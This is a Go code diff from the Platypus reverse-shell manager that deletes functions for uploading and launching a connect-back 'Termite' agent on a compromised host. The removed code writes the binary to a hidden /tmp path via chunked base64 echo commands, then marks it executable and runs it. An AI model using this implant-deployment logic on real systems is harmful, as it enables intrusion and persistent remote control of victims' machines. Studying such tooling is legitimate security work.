@@ -3,7 +3,6 @@ package core
 import (
 	"bytes"
 	"encoding/base64"
-	"encoding/json"
 	"errors"
 	"fmt"
 	"net"
@@ -15,13 +14,10 @@ import (
 
 	humanize "github.com/dustin/go-humanize"
 	"github.com/jedib0t/go-pretty/v6/table"
-	"github.com/vbauerster/mpb/v6"
-	"github.com/vbauerster/mpb/v6/decor"
 	"golang.org/x/term"
 
 	"github.com/WangYihang/Platypus/internal/log"
 	"github.com/WangYihang/Platypus/internal/session"
-	"github.com/WangYihang/Platypus/internal/utils/compiler"
 	"github.com/WangYihang/Platypus/internal/utils/hash"
 	oss "github.com/WangYihang/Platypus/internal/utils/os"
 	"github.com/WangYihang/Platypus/internal/utils/str"
@@ -860,197 +856,3 @@ func (c *TCPClient) GatherClientInfo(hashFormat string) {
 	c.mature = true
 }
 
-func (client *TCPClient) NotifyWebSocketCompilingTermite(progress int) {
-	if Ctx.NotifyWebSocket != nil {
-		// WebSocket Broadcast
-		type CompilingTermite struct {
-			Client     TCPClient
-			ServerHash string
-			Progress   int
-		}
-		msg, _ := json.Marshal(WebSocketMessage{
-			Type: COMPILING_TERMITE,
-			Data: CompilingTermite{
-				Client:     *client,
-				ServerHash: client.server.Hash,
-				Progress:   progress,
-			},
-		})
-		// Notify to all websocket clients
-		Ctx.NotifyWebSocket.Broadcast(msg)
-	}
-}
-
-func (client *TCPClient) NotifyWebSocketCompressingTermite(progress int) {
-	if Ctx.NotifyWebSocket != nil {
-		// WebSocket Broadcast
-		type CompressingTermite struct {
-			Client     TCPClient
-			ServerHash string
-			Progress   int
-		}
-		msg, _ := json.Marshal(WebSocketMessage{
-			Type: COMPRESSING_TERMITE,
-			Data: CompressingTermite{
-				Client:     *client,
-				ServerHash: client.server.Hash,
-				Progress:   progress,
-			},
-		})
-		// Notify to all websocket clients
-		Ctx.NotifyWebSocket.Broadcast(msg)
-	}
-}
-
-func (client *TCPClient) NotifyWebSocketUploadingTermite(bytesSent int, bytesTotal int) {
-	if Ctx.NotifyWebSocket != nil {
-		// WebSocket Broadcast
-		type UploadingTermite struct {
-			Client     TCPClient
-			ServerHash string
-			BytesSent  int
-			BytesTotal int
-		}
-		msg, _ := json.Marshal(WebSocketMessage{
-			Type: UPLOADING_TERMITE,
-			Data: UploadingTermite{
-				Client:     *client,
-				ServerHash: client.server.Hash,
-				BytesSent:  bytesSent,
-				BytesTotal: bytesTotal,
-			},
-		})
-		// Notify to all websocket clients
-		Ctx.NotifyWebSocket.Broadcast(msg)
-	}
-}
-
-func (c *TCPClient) UpgradeToTermite(connectBackHostPort string) {
-	if c.OS == oss.Windows {
-		// TODO: Windows Upgrade
-		log.Error("Upgrade to Termite on Windows client is not supported")
-		return
-	}
-
-	// Step 0: Generate temp folder and filename
-	dir, filename, err := compiler.GenerateDirFilename()
-	if err != nil {
-		log.Error("%s", err)
-		return
-	}
-	defer os.RemoveAll(dir)
-
-	// Step 1: Generate Termite from Assets
-	c.NotifyWebSocketCompilingTermite(0)
-	err = compiler.BuildTermiteFromPrebuildAssets(filename, connectBackHostPort)
-	if err != nil {
-		c.NotifyWebSocketCompilingTermite(-1)
-	} else {
-		c.NotifyWebSocketCompilingTermite(100)
-	}
-
-	// Step 2: Upx compression
-	c.NotifyWebSocketCompressingTermite(0)
-	if !compiler.Compress(filename) {
-		c.NotifyWebSocketCompressingTermite(-1)
-	} else {
-		c.NotifyWebSocketCompressingTermite(100)
-	}
-
-	// Upload Termite Binary
-	dst := fmt.Sprintf("/tmp/.%s", str.RandomString(0x10))
-	if !c.Upload(filename, dst, true) {
-		log.Error("Upload failed")
-		return
-	}
-
-	// Execute Termite Binary
-	// On Ubuntu Server 20.04.2 TencentCloud, the chmod binary is stored at
-	// /bin/chmod. This would cause the execution of termite failed. So we
-	// use the relative command `chmod` instead of `/usr/bin/chmod`
-	c.SystemToken(fmt.Sprintf("chmod +x %s && %s", dst, dst))
-}
-
-func (c *TCPClient) Upload(src string, dst string, broadcast bool) bool {
-	// Check existance of remote path
-	dstExists, err := c.FileExists(dst)
-	if err != nil {
-		log.Error("%s", err.Error())
-		return false
-	}
-
-	if dstExists {
-		log.Error("The target path is occupied, please select another destination")
-		return false
-	}
-
-	// Read local file content
-	content, err := os.ReadFile(src)
-	if err != nil {
-		log.Error("%s", err.Error())
-		return false
-	}
-
-	log.Info("Uploading %s to %s", src, dst)
-
-	// 1k Segment
-	segmentSize := 0x1000
-
-	bytesSent := 0
-	totalBytes := len(content)
-
-	c.NotifyWebSocketUploadingTermite(bytesSent, totalBytes)
-
-	segments := totalBytes / segmentSize
-	overflowedBytes := totalBytes - segments*segmentSize
-
-	p := mpb.New(
-		mpb.WithWidth(64),
-	)
-
-	bar := p.Add(int64(totalBytes), mpb.NewBarFiller("[=>-|"),
-		mpb.PrependDecorators(
-			decor.CountersKibiByte("% .2f / % .2f"),
-		),
-		mpb.AppendDecorators(
-			decor.EwmaETA(decor.ET_STYLE_HHMMSS, 60),
-			decor.Name(" ] "),
-			decor.EwmaSpeed(decor.UnitKB, "% .2f", 60),
-		),
-	)
-
-	// Firstly, use redirect `>` to create file, and write the overflowed bytes
-	start := time.Now()
-	c.SystemToken(fmt.Sprintf(
-		"echo %s| base64 -d > %s",
-		base64.StdEncoding.EncodeToString(content[0:overflowedBytes]),
-		dst,
-	))
-
-	bar.IncrBy(overflowedBytes)
-
-	bytesSent += overflowedBytes
-	c.NotifyWebSocketUploadingTermite(bytesSent, totalBytes)
-
-	bar.DecoratorEwmaUpdate(time.Since(start))
-
-	// Secondly, use `>>` to append all segments left except the final one
-	for i := 0; i < segments; i++ {
-		start = time.Now()
-		c.SystemToken(fmt.Sprintf(
-			"echo %s| base64 -d >> %s",
-			base64.StdEncoding.EncodeToString(content[overflowedBytes+i*segmentSize:overflowedBytes+(i+1)*segmentSize]),
-			dst,
-		))
-		bytesSent += segmentSize
-		bar.IncrBy(segmentSize)
-		bar.DecoratorEwmaUpdate(time.Since(start))
-
-		if broadcast && i%0x10 == 0 {
-			c.NotifyWebSocketUploadingTermite(bytesSent, totalBytes)
-		}
-	}
-	p.Wait()
-	c.NotifyWebSocketUploadingTermite(bytesSent, totalBytes)
-	return true
-}
